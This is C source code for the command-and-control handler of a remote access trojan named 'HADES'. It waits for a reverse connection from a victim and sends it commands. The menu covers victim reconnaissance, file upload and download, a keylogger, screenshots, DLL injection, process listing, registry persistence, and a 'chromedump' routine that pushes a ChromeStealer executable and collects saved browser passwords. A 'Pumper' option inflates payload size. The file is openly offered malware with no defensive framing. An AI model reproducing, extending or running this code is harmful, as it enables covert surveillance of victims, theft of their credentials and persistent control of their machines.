// gcc LinClient.c -o Hades

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <sys/wait.h>
#include <signal.h>
#include <ctype.h>          
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/queue.h>
#include <fcntl.h>

#define MAX_LEN 128


#define RED  "\x1B[31m"
#define GRN  "\x1B[32m"
#define YEL  "\x1B[33m"
#define BLU  "\x1B[34m"
#define MAG  "\x1B[35m"
#define CYN  "\x1B[36m"
#define WHT  "\x1B[37m"
#define RESET "\x1B[0m"

#define BOLDRED  "\x1B[1m\033[31m"
#define BOLDGRN  "\x1B[1m\033[32m"
#define BOLDYEL  "\x1B[1m\033[33m"
#define BOLDBLU  "\x1B[1m\033[34m"
#define BOLDMAG  "\x1B[1m\033[35m"
#define BOLDCYN  "\x1B[1m\033[36m"
#define BOLDWHT  "\x1B[1m\033[37m"


void print_image(FILE *fptr);

struct sockaddr_in serv_addr,cli_addr;
int sock_fd=0,new_sock_fd=0,clilen=0,n=0;
int n;

void ErrorMessage(const char *msg){
    perror(msg);
    return;
}

void print_image(FILE *fptr)
{
    char read_string[MAX_LEN];
 
    while(fgets(read_string,sizeof(read_string),fptr) != NULL)
        printf("%s%s", BOLDRED,read_string);

}

void processtext(FILE *procfile)
{
    char read_string[MAX_LEN];
 
    while(fgets(read_string,sizeof(read_string),procfile) != NULL)
        printf("%s%s", BOLDWHT,read_string);

}







int Upload(void) { 

    char upload[1024] = "upload";
    char filepath[1024];
    char success[14];

    n=write(new_sock_fd,upload,strlen(upload));
    printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Please Input the Path To The File: ");

    bzero(filepath,1024);
    fgets(filepath, sizeof filepath ,stdin); 
    strtok(filepath, "\n");


    FILE *fp = fopen(filepath, "rb");
    if(fp == NULL) {
	printf("[!] Error Opening File!");
    }	
    sleep(1);

    n=write(new_sock_fd,filepath,strlen(filepath));
    printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Sending...\n");
		
    while(1) {
	unsigned char buff[163840] = {0};
        int nread = fread(buff,1,163840,fp);


        if(nread > 0) {
	    write(new_sock_fd, buff, nread);	
	    sleep(1);
	}
	
	if (nread < 10) {
            if (feof(fp))
	        printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " File Sent!\n");
		write(new_sock_fd, "Uploaded", 8);
		break;
	    if (ferror(fp))
		printf("[!] Error Reading and Sending File!");
	    break;
	}
	sleep(1);
    }
}


int Shell(){

    char command[1024];
    char help[1024] = "help";
    char close[1024] = "close";
    char info[1024] = "info";
    char time[1024] = "time";
    char clear[1024] = "clear";
    char upload[1024] = "upload";
    char download[1024] = "download";
    char keylogger[1024] = "keylogger";
    char screenshot[1024] = "screenshot";
    char inject[1024] = "inject";
    char ps[1024] = "ps";
    char filepath[1024];
    char HELP[1024] ="\n   [ ------------------ HELP MENU ------------------ ]\n   [ Help - Print Help Menu                          ]\n   [ Close - Close Connection                        ]\n   [ Info - Receive Target Information               ]\n   [ Time - Retrieve Target System Time              ]\n   [ Clear - Clear Terminal                          ]\n   [ Upload - Upload File To System                  ]\n   [ Download - Download File From System            ]\n   [ Keylogger - Log Keystrokes                      ]\n   [ Inject - Inject a DLL into Process   	     ]\n   [ Cmd - Enter Remote Shell	        	     ]\n   [ Ps - View Running Processes	   	     ]\n   [ Persist - Attempt to Gain Persistence    	     ]\n   [ DelPersist - Remove Persistence from Target     ]\n   [ ChromeDump - Extract Saved Chrome Passwords     ]\n   [ ------------------ HELP MENU ------------------ ]\n\n";  


    int bytesReceived = 0;
    char sendBuff[4096];
    char recvBuff[4096];
    char savename[1024];
    memset(sendBuff, '0', sizeof(sendBuff));
    memset(recvBuff, '0', sizeof(recvBuff));

    char sleeptime[100];
    char succ[1024];
    char bmpfile[1024];
    char log[1024];

    char COMPUTER[1024];
    char USER[1024];
    char OS[1024];
    char MAC[1024];
    char ARCH[1024];
    char filename[1024];
    char WANIP[1024];

    char PROCESS[1024];
    char DLL[1024];
    char INPUT[1024];
    char UPLOADED[1024];

    char *p=getenv("USER");


    sleep(1);
    printf(BOLDBLU "  [" BOLDGRN ">>" BOLDBLU "]" BOLDWHT " HADES Shell Session Opened!\n");

    while(1) {
 
        printf(BOLDBLU "  [" BOLDGRN ">>" BOLDBLU "]" BOLDRED " %s@%s" BOLDWHT ":" BOLDBLU "~" BOLDWHT"$ ", p, inet_ntoa(cli_addr.sin_addr));
	bzero(command, 1024);
	fgets(command, 1024, stdin);


         if (strncmp(command, help, strlen(help)) == 0) {
	     printf(HELP);
        }

        else if (strncmp(command, close, strlen(close)) == 0) {
            n=write(new_sock_fd,close,strlen(close));
	    printf(BOLDBLU"  [" BOLDRED "!!" BOLDBLU "]" BOLDWHT " Closing...\n");
	    exit(1);
	}

        else if (strncmp(command, info, strlen(info)) == 0) {

	    bzero(command, 1024);

	    printf(BOLDBLU"  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Retrieving Target Info...\n\n");
            n=write(new_sock_fd,info,strlen(info));

	    if(n<0)
	        ErrorMessage(BOLDBLU "  [" BOLDRED "!!" BOLDBLU "]" BOLDWHT " Error writing to socket!\n");

            n=read(new_sock_fd,COMPUTER,1024);
            n=read(new_sock_fd,USER,1024);
            n=read(new_sock_fd,OS,1024);
            n=read(new_sock_fd,WANIP,1024);
	  

            printf(BOLDBLU "   [" BOLDGRN"[]" BOLDBLU "]" BOLDWHT " Computer Name    -    %s " BOLDBLU "   		[" BOLDGRN "[]" BOLDBLU "]\n", COMPUTER);
            printf(BOLDBLU"   [" BOLDGRN "[]" BOLDBLU "]" BOLDWHT " Current User     -    %s " BOLDBLU "   		[" BOLDGRN "[]" BOLDBLU "]\n", USER);
            printf(BOLDBLU"   [" BOLDGRN "[]" BOLDBLU "]" BOLDWHT " Victims OS       -    %s " BOLDBLU "   		[" BOLDGRN "[]" BOLDBLU "]\n", OS);
            printf(BOLDBLU"   [" BOLDGRN "[]" BOLDBLU "]" BOLDWHT " Victims WAN IP   -    %s " BOLDBLU "   		[" BOLDGRN "[]" BOLDBLU "]\n\n", WANIP);
	} 


        else if (strncmp(command, time, strlen(time)) == 0) {

            n=write(new_sock_fd,time,strlen(time));

	    if(n<0)
	        ErrorMessage(BOLDBLU "  [" BOLDRED "!!" BOLDBLU "]" BOLDWHT " Error writing to socket");

            bzero(time,1024);
            n=read(new_sock_fd,time,1024);
          
            if(n<0)
	        ErrorMessage(BOLDBLU "  [" BOLDRED "!!" BOLDBLU "]" BOLDWHT "Error reading socket!");

            printf(BOLDBLU "  [" BOLDGRN ">>" BOLDBLU "]" BOLDWHT " %s\n", time);

	}


        else if (strncmp(command, clear, strlen(clear)) == 0) {
	    system("clear");
	}

        else if (strncmp(command, upload, strlen(upload)) == 0) {
	    printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Initializing Upload Function...\n");
	    Upload();

        }

        else if (strncmp(command, download, strlen(download)) == 0) {

    	    printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Initializing Download Feature...\n");

            n=write(new_sock_fd,download,strlen(download));

    	    printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Please Input the Path Of The File To Download: ");

	    bzero(filename,1024);
	    fgets(filename, sizeof filename  ,stdin); 
            strtok(filename, "\n");

	    printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Please Input the Name To Save As: ");

	    bzero(savename,1024);
	    fgets(savename, 1024 ,stdin); 
	    strtok(savename, "\n");

	    FILE *fd;
	    fd = fopen(savename, "wb");

	    printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Opening File With The Name %s...\n", savename);
	    if(NULL == fd) {
	        printf(BOLDBLU "  [" BOLDRED "!!" BOLDBLU "]" BOLDWHT " Failed to open file!\n");
	    }  


	    n=write(new_sock_fd,filename,strlen(filename));

	    while((bytesReceived = read(new_sock_fd, recvBuff, 1024)) > 0) {


		printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Bytes Received %d...\n", bytesReceived);
	        if (bytesReceived < 12) {
		    fclose(fd);
		    printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " File Downloaded!\n");
		    break;
		}
		fwrite(recvBuff, 1, bytesReceived,fd);


	    }
		

	}



        else if (strncmp(command, keylogger, strlen(keylogger)) == 0) {
	    n=write(new_sock_fd,keylogger,strlen(keylogger)); 

	    printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " How Many Seconds Should The Logger Run For? ");

	    bzero(sleeptime,100);
	    fgets(sleeptime, 100 ,stdin); 

	    printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Keylogger Activated...\n");
	    printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Please Wait...\n");

	    n=write(new_sock_fd,sleeptime,strlen(sleeptime));

    	    n=read(new_sock_fd,succ,1024);
	    printf(succ);
	    bzero(succ, 1024);
	
	    printf(BOLDBLU "  [" BOLDGRN "??" BOLDBLU "]" BOLDWHT " Would You Like To Download The Log File? Y/N ");

	    bzero(log,100);

	    fgets(log, 100 ,stdin); 

            if (strncmp(log, "Y", 1) == 0) {

                n=write(new_sock_fd,log,strlen(log));

		printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Downloading Log File...\n");

		FILE *svchost;

		svchost = fopen("svchost.log", "w");

		printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Opening File 'SVCHOST.LOG'...\n");

		if (NULL == svchost) {

		    break;

		}
		
		while((bytesReceived = read(new_sock_fd, recvBuff, 1024)) > 0) {

		    fwrite(recvBuff, 1, bytesReceived, svchost);

		    printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Receiving SVCHOST.LOG...\n");

	        fclose(svchost);

		printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Successfully Downloaded SVCHOST.LOG!\n");

		break;
		}

	        if(bytesReceived < 0) {

		    break;
	        }
		
	    }

	    else {

                n=write(new_sock_fd,log,strlen(log));

	        printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Not Downloading Log File.\n");

		printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Exiting Keylogger...\n");	
	    }
	
	}


        else if (strncmp(command, screenshot, strlen(screenshot)) == 0) {

	    n=write(new_sock_fd,screenshot,strlen(screenshot));

    	    n=read(new_sock_fd,bmpfile,1024);

	    printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT "%s", bmpfile);
	}


        else if (strncmp(command, inject, strlen(inject)) == 0) {

	    n = write(new_sock_fd, inject, strlen(inject));

	    printf(BOLDBLU "  [" BOLDGRN "??" BOLDBLU "]" BOLDWHT " Which Process ID Would You Like To Migrate to? ");

            bzero(PROCESS,100);

    	    fgets(PROCESS, 100 ,stdin); 

    	    n = write(new_sock_fd, PROCESS, strlen(PROCESS));

    	    printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Attempting To Inject LOCAL.dll Into Process %s...\n", PROCESS);

      	    n=read(new_sock_fd,DLL,1024);

    	    printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT "%s", DLL);	
	
	}

        else if (strncmp(command, ps, strlen(ps)) == 0) {
	    write(new_sock_fd, ps, strlen(ps));

	    FILE *procfile;
	    procfile = fopen("proc.txt", "wb");

	    if(NULL == procfile) {
	        printf(BOLDBLU "  [" BOLDRED "!!" BOLDBLU "]" BOLDWHT " Failed!\n");
	    }  

	    printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Receiving Running Processes...\n");
	    while((bytesReceived = read(new_sock_fd, recvBuff, 4096)) > 0) {
	        if (bytesReceived < 12) {
		    fclose(procfile);
		    FILE *procfile1;
                    procfile1 = fopen("proc.txt", "r");
    		    processtext(procfile1);
 		    fclose(procfile1); 
		    remove("proc.txt"); 
		    break;
		}
		fwrite(recvBuff, 1, bytesReceived,procfile);


	    }
		

	}



        else if (strncmp(command, "cmd", 3) == 0) {
    	    printf(BOLDBLU "  [" BOLDRED "!!" BOLDBLU "]" BOLDWHT " Work In Progress!\n");
	}

        else if (strncmp(command, "chromedump", 10) == 0) {	
	    char Uploaded[1024];
	    write(new_sock_fd, "chromestealer", 13);
	    printf(BOLDBLU "  [" BOLDRED "!!" BOLDBLU "]" BOLDWHT " Warning! Uploading ChromeStealer Takes A Long Time Due To Its Size!\n");
	    printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Has ChromeStealer Been Uploaded? Y/N: ");
	    bzero(Uploaded,100);
	    fgets(Uploaded, 100 ,stdin); 	
	    if (strncmp(Uploaded, "N", 1) == 0) {	
	    	write(new_sock_fd, Uploaded, 1);
		
    	   	char filepath[1024];
    	    	char success[14];
      	    	char chromestealer[1024] = "chromestealer.exe";

    	    	FILE *chrome = fopen(chromestealer, "rb");
            	if(chrome == NULL) {
		    printf("[!] Error Opening File!");
    	    	}	
            	sleep(1);
	    	write(new_sock_fd, "chromestealer", 13);

            	printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Sending...\n");
		
            	while(1) {
	   	    unsigned char buff[8192] = {0};
       	 	    int nread = fread(buff,1,8192,chrome);

        	    if(nread > 0) {
	            	write(new_sock_fd, buff, nread);	
	            	sleep(1);
		    }
	
		    if (nread < 10) {
           	    	if (feof(chrome))
	            	printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " File Sent!\n");
		    	write(new_sock_fd, "Uploaded", 8);
		    	break;
	    	    if (ferror(chrome))
		    	printf("[!] Error Reading and Sending File!");
	            break;
	            }
	        }
	        sleep(1);

	    	FILE *chromepass;
	    	chromepass = fopen("chromepass.txt", "wb");

	    	if(NULL == chromepass) {
	            printf(BOLDBLU "  [" BOLDRED "!!" BOLDBLU "]" BOLDWHT " Failed!\n");
	    	}  

	    	printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Receiving Passwords...\n");
	    	while((bytesReceived = read(new_sock_fd, recvBuff, 4096)) > 0) {
	            if (bytesReceived < 12) {
		    	fclose(chromepass);
		    	FILE *chromepass1;
                    	chromepass1 = fopen("chromepass.txt", "r");
		    	printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Passwords Received: \n");
    		    	processtext(chromepass1);
 		    	fclose(chromepass1); 
		    	remove("chromepass.txt"); 
		    	break;
		    }
		    fwrite(recvBuff, 1, bytesReceived,chromepass);


	        }
		
            }

	    else if (strncmp(Uploaded, "Y", 1) == 0) {	
		write(new_sock_fd, Uploaded, 1);
	        sleep(1);

	    	FILE *chromepass;
	    	chromepass = fopen("chromepass.txt", "wb");

	    	if(NULL == chromepass) {
	            printf(BOLDBLU "  [" BOLDRED "!!" BOLDBLU "]" BOLDWHT " Failed!\n");
	    	}  

	    	printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Receiving Passwords...\n");
	    	while((bytesReceived = read(new_sock_fd, recvBuff, 4096)) > 0) {
	            if (bytesReceived < 12) {
		    	fclose(chromepass);
		    	FILE *chromepass1;
                    	chromepass1 = fopen("chromepass.txt", "r");
		    	printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Passwords Received: \n");
    		    	processtext(chromepass1);
 		    	fclose(chromepass1); 
		    	remove("chromepass.txt"); 
		    	break;
		    }
		    fwrite(recvBuff, 1, bytesReceived,chromepass);


	        }
		
            }
	}
		

        else if (strncmp(command, "persist", 7) == 0) {
            char checking1[1024];
	    write(new_sock_fd, "persistence", 11);
	    printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Adding Persistence\n");
	    n = read(new_sock_fd, checking1, 1024);
	    if (strncmp(checking1, "Added", 5) == 0) {
		printf (BOLDBLU "  [" BOLDGRN "!!" BOLDBLU "]" BOLDWHT " Persistence Added!\n");
	    }

	    else {
		printf (BOLDBLU "  [" BOLDRED "!!" BOLDBLU "]" BOLDWHT " Failed Creating Registry Key For Persistence!\n");
	    }
	}

	else if (strncmp(command, "delpersist", 10) == 0) {
            char checking[1024];
	    write(new_sock_fd, "delpersist", 10);
	    printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " Removing Persistence\n");
	    n = read(new_sock_fd, checking, 1024);
	    if (strncmp(checking, "Removed", 7) == 0) {
		printf (BOLDBLU "  [" BOLDGRN "!!" BOLDBLU "]" BOLDWHT " Persistence Removed!\n");
	    }
	    else {
		printf (BOLDBLU "  [" BOLDRED "!!" BOLDBLU "]" BOLDWHT " Failed Removing Persistent Registry Key!\n");
	    }
	}
	    

	else {

    	    n=write(new_sock_fd,command,strlen(command));
 
    	    if(n<0)

    	        ErrorMessage(BOLDBLU "  [" BOLDRED "!!" BOLDBLU "]" BOLDWHT " Error writing in socket");

    	    bzero(command,1024);

    	    n=read(new_sock_fd,command,1024);
 
    	    if(n<0)

    	    	ErrorMessage(BOLDBLU "  [" BOLDRED "!!" BOLDBLU "]" BOLDWHT " Error reading socket");

    	    printf(BOLDBLU "  [" BOLDGRN "**" BOLDBLU "]" BOLDWHT " %s\n",command);	
	} 	


    }

}




int Server(){

    char ports[1024];
    int pid;
    int optval = 1;
    sock_fd=socket(AF_INET,SOCK_STREAM, 0);
    int i;
    char *SockArr[5] = {0};

    if (setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof (optval)) <0) {
        printf("[!!] Setting TCP socket option error");
	return 1;
    }
 
    if(sock_fd<0)
        fprintf(stderr,"[!] Error Opening Socket Handler!\n");
 
    bzero((char *)&serv_addr,sizeof(serv_addr));

    printf(BOLDBLU"  ["BOLDGRN">>"BOLDBLU"]" BOLDGRN" Please Input The Port To Accept Connections on: ");
    fgets(ports, BUFSIZ, stdin);
    int port = atoi(ports);
 
    serv_addr.sin_family=AF_INET;
    serv_addr.sin_port=htons(port);
    serv_addr.sin_addr.s_addr=INADDR_ANY;
 
    if(bind(sock_fd, (struct sockaddr *) &serv_addr,sizeof(serv_addr))<0)
        ErrorMessage("[!] Error Binding!\n");

    listen(sock_fd,5);

    printf(BOLDBLU "  [" BOLDGRN ">>" BOLDBLU"]" BOLDGRN " Waiting For Reverse Connection From Target...\n");
    clilen=sizeof(cli_addr);

    new_sock_fd=accept(sock_fd,(struct sockaddr *)&cli_addr,&clilen);


    if(new_sock_fd<0)
        ErrorMessage("[!] Error Accepting Server Connection!\n");
    printf(BOLDBLU"\n  [" BOLDGRN ">>" BOLDBLU"]" BOLDWHT " Received Connection From" BOLDRED" %s" BOLDWHT"!\n",inet_ntoa(cli_addr.sin_addr));
    printf(BOLDBLU"  [" BOLDGRN">>" BOLDBLU"]" BOLDWHT" Initiating Command Shell...\n");
    Shell();   
    printf(BOLDBLU "  [" BOLDRED "!!" BOLDBLU "]" BOLDWHT " Shell Closed! Returning...\n");
    return 0;
}
    


int main(void) { 
    char mainmenu[1024];
    char buffer[1024];

    system("clear");
 
    char *filename = "menu.txt";
    FILE *fptr = NULL;
 
    fptr = fopen(filename,"r");
 
    print_image(fptr);
 
    fclose(fptr);
       	                     
    char *p=getenv("USER");
 
    printf(BOLDWHT"\n\n					   [--] PLEASE CHOOSE AN OPTION.\n\n");
    printf(BOLDBLU"	[" BOLDGRN"01" BOLDBLU"]"BOLDGRN"  Handler > Start Handler to listen for incoming connections. \n");
    printf(BOLDBLU"	[" BOLDGRN"02" BOLDBLU"]"BOLDGRN"  Pumper  > Increase the size of your file. Requires Python.\n"); 
    printf(BOLDBLU"	["BOLDGRN"03"BOLDBLU"]" BOLDGRN"  Help    > Display Help Menu\n");
    printf(BOLDBLU"	["BOLDGRN"04"BOLDBLU"]"BOLDGRN"  Exit    > Exit HADES\n");
    printf(BOLDBLU"  ["BOLDGRN">>"BOLDBLU"]"BOLDRED" %s@HADES"BOLDWHT":"BOLDBLU"~" BOLDWHT "$ ", p);
    fgets(mainmenu,1024,stdin);

    if (strncmp(mainmenu, "Handler", 7) == 0 || (strncmp(mainmenu, "handler", 7) == 0 || (strncmp(mainmenu, "1", 1) == 0))) {
	printf("\n			[>>] STARTING HANDLER [<<]\n\n");
	Server();
    }

    else if (strncmp(mainmenu, "Pumper", 6) == 0 || (strncmp(mainmenu, "pumper", 6) == 0 || (strncmp(mainmenu, "2", 1) == 0))) {
	system("clear");
	system("xterm -fa monaco -fs 13 -e python filepump.py");
	main();

    }


    else if (strncmp(mainmenu, "Help", 4) == 0 || (strncmp(mainmenu, "help", 4) == 0 || (strncmp(mainmenu, "3", 1) == 0))) {
	printf("[!] Not Implemented Yet!\n");
	return 0;
    }

    else if (strncmp(mainmenu, "Exit", 4) == 0 || (strncmp(mainmenu, "exit", 4) == 0 || (strncmp(mainmenu, "4", 1) == 0))) {
	printf("[!] Exiting!\n");
	return 0;
    }

    else {
	printf("[!] Input Not Valid!\n");
	system("clear");
	main();
    }
}



